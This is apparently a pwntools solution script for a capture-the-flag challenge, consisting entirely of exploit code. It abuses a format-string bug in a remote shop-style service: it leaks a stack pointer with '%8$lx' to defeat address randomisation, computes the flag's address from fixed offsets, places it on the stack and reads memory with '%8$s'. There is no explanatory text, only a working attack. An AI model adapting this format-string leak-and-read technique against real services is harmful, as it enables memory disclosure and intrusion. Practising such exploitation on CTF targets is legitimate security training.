from pwn import *

r = remote("challenge.ctf.games", 31698)
r.recvuntil(b">")
r.sendline(b"5")
r.recvuntil(b'buy?:')
r.sendline(b"%8$lx")

stuff = r.recvuntil(b'>').split(b"[1]")[0].split(b'\n')[0].split(b" ")[-1]
stuff = int(stuff.decode("utf-8"), 16)

init_off = 0x1740

base = stuff - init_off
flag_off = 0x4060

flag_addr = base + flag_off

r.sendline(b"5")
r.recvuntil(b'buy?:')

payload = b"a"*8*2 + p64(flag_addr)

r.sendline(payload)
r.recvuntil(b">")

r.sendline(b"5")
r.recvuntil(b'buy?:')

payload = b"%8$s"

r.sendline(payload)

r.interactive()